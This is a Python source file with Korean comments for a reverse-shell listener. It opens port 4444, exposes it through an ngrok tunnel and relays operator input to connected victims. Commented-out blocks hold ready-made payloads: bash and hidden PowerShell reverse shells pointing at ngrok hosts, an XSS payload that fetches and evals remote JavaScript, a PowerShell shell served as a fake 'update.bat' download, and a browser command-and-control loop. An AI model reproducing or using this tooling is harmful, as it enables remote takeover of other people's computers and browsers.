import re
import subprocess
import threading
import sys
import time
import socket
import signal
import os

# 전역 종료 플래그
shutdown_flag = False

def signal_handler(sig, frame):
    global shutdown_flag
    print("\n[!] Ctrl+C detected. Shutting down...")
    shutdown_flag = True
    sys.exit(0)  # 즉시 종료

def main():
    global shutdown_flag
    
    # 소켓 오픈
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    server.settimeout(1)  # 타임아웃 설정으로 종료 확인 가능하게

    ngrok = subprocess.Popen(
        ["ngrok", "tcp", "4444", "--log", "stdout"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=0,
    )

    try:
        for line in ngrok.stdout:
            if shutdown_flag:
                break
                
            tcp_match = re.search(r"tcp://([^\s]+):(\d+)", line)
            http_match = re.search(r"https?://([^\s]+).app", line)
            
            if tcp_match:
                full_addr = tcp_match.group(0)
                print("Public TCP PROTOCOL : /dev/tcp/" + "/".join(full_addr.lstrip("tcp://").split(":"))) # RCE 명령 주소 /dev/tcp/~
                print("Public TCP raw http : http://" + full_addr.lstrip("tcp://")) # tcp addr
                print("ngrok Dashboard : 127.0.0.1:4040")
                break
            elif http_match:
                full_url = http_match.group(0)
                print("Public HTTPS URL : " + full_url) # https public web => http 방식 통신 시
                print("ngrok Dashboard : 127.0.0.1:4040")
                break

            # Linux
            # bash -i >&(표준출력 1, 표준에러 2 소켓으로 보냄) /dev/tcp/0.tcp.jp.ngrok.io/12707 0>&1 (표준입력 0을 표준 출력 1이 가는 곳으로 보내기)

            # Window
            # powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('0.tcp.jp.ngrok.io',12707);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

    except KeyboardInterrupt:
        print("\n[!] Interrupted during ngrok startup")
        ngrok.terminate()
        server.close()
        sys.exit(0)

    print("listening on [any] 4444 ...")
    signal.signal(signal.SIGINT, signal_handler)

    def socket_conn(conn, addr):
        global shutdown_flag
        print(f"connect to [{addr[0]}] from [{addr[0]}] {addr[1]}")

        # 파일 바이너리 전달
        # with open("./test.exe", "rb") as f:
        #     file_data = f.read()
        #     conn.send("HTTP/1.1 200 OK\r\n".encode())
        #     conn.send(f"Content-Length: {len(file_data)}\r\n".encode())
        #     conn.send("\r\n".encode())
        #     conn.send(file_data)


        # 요청 및 응답 데이터 eval 실행 => 웹 XSS 구문 => attackerUrl 에서 응답온거 자바스크립트 eval로 실행
        # <img src=x onmouseover="fetch('attackerUrl').then(function(r) {return r.text()}).then(function(t) {eval(t)})"//


        # IE 환경에서 가능한 리버스쉘
        # script = eval("new ActiveXObject('WScript.Shell').Run('powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient(\\\"0.tcp.jp.ngrok.io\\\",16445);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+\\\"PS \\\"+(pwd).Path+\\\"> \\\";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\"')")
        # conn.send("HTTP/1.1 200 OK\r\n".encode())
        # conn.send(f"Content-Length: {len(script)}\r\n".encode())
        # conn.send("\r\n".encode())
        # conn.send(script.encode())

        # 자바스크립트 코드를 문자열로 저장
        # js_code = """new ActiveXObject('WScript.Shell').Run('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\\"0.tcp.jp.ngrok.io\\",18693);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+\\"PS \\"+(pwd).Path+\\"> \\";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"')"""
        # HTTP 응답으로 전송
        # response = (
        #     "HTTP/1.1 200 OK\r\n"
        #     "Content-Type: application/javascript\r\n"
        #     f"Content-Length: {len(js_code)}\r\n"
        #     "\r\n"
        #     f"{js_code}"
        # )
        # conn.sendall(response.encode())


        # # PowerShell 리버스쉘 스크립트를 .bat 파일로 위장 다운 시도
        # bat_code = f"""@echo off
        #     powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('0.tcp.jp.ngrok.io', 17374);$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=([text.encoding]::ASCII).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length)}};$c.Close()"
        #     """
        # response = (
        #     "HTTP/1.1 200 OK\r\n"
        #     "Content-Type: application/octet-stream\r\n"
        #     "Content-Disposition: attachment; filename=\"update.bat\"\r\n"
        #     f"Content-Length: {len(bat_code)}\r\n"
        #     "\r\n"
        #     f"{bat_code}"
        # )
        # conn.sendall(response.encode())


        # eval_code = """(function(){
        #                 const u = "https://265f-112-221-4-242.ngrok-free.app";
                        
        #                 function s(d) {
        #                     fetch(u + "/result", {
        #                         method: "POST",
        #                         headers: {'ngrok-skip-browser-warning': 'true'},
        #                         body: String(d)
        #                     }).catch(e => console.log(e));
        #                 }
                        
        #                 function p() {
        #                     fetch(u + "/cmd", {
        #                         method: "POST",
        #                         headers: {'ngrok-skip-browser-warning': 'true'}
        #                     }).then(r => r.text()).then(c => {
        #                         if (c && c !== "wait") {
        #                             try {
        #                                 let r = eval(c);
        #                                 if (r === undefined) r = "[+] Done";
        #                                 s(r);
        #                             } catch(e) {
        #                                 s("[!] Error: " + e.message);
        #                             }
        #                         }
        #                         setTimeout(p, 2000);
        #                     }).catch(() => setTimeout(p, 2000));
        #                 }
                        
        #                 s("[+] XSS Shell Connected");
        #                 p();
        #             })();"""

        # response = (
        #     "HTTP/1.1 200 OK\r\n"
        #     "Content-Type: application/octet-stream\r\n"
        #     "Content-Disposition: attachment; filename=\"update.bat\"\r\n"
        #     f"Content-Length: {len(eval_code)}\r\n"
        #     "\r\n"
        #     f"{eval_code}"
        # )
        # conn.sendall(response.encode())


        
        # 입력 받기
        def send_input():
            nonlocal conn
            while not shutdown_flag:
                try:
                    user_input = input()
                    if shutdown_flag:
                        break
                    conn.send((user_input + "\n").encode())
                except (EOFError, KeyboardInterrupt):
                    print("\n[!] Input interrupted")
                    break
                except OSError:
                    break
        
        input_thread = threading.Thread(target=send_input, daemon=True)
        input_thread.start()
        
        # 출력 읽기
        while not shutdown_flag:
            try:
                conn.settimeout(0.5)
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode('utf-8', errors='replace'), end="", flush=True)
            except socket.timeout:
                continue
            except (ConnectionResetError, OSError):
                break
            except KeyboardInterrupt:
                break
        
        conn.close()

    try:
        while not shutdown_flag:
            try:
                conn, addr = server.accept()
                if shutdown_flag:
                    conn.close()
                    break
                threading.Thread(target=socket_conn, args=(conn, addr), daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C pressed, shutting down...")
    finally:
        print("[*] Cleaning up...")
        shutdown_flag = True
        ngrok.terminate()
        ngrok.wait(timeout=2)
        server.close()
        print("[*] Done. Exiting.")
        os._exit(0)  # 강종

if __name__ == "__main__":
    main()